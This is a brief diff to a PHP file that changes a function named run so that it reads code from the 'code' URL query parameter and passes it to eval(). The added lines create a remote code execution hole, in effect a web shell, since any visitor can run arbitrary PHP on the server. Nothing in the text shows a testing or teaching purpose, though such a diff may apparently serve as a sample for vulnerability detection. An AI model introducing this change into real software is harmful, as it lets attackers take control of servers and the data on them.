@@ -1,7 +1,8 @@
 <?php
 
-function run(string $code): mixed
+function run(): mixed
 {
+    $code = $_GET['code'] ?? '1 === 1';
     return eval($code);
 }
 
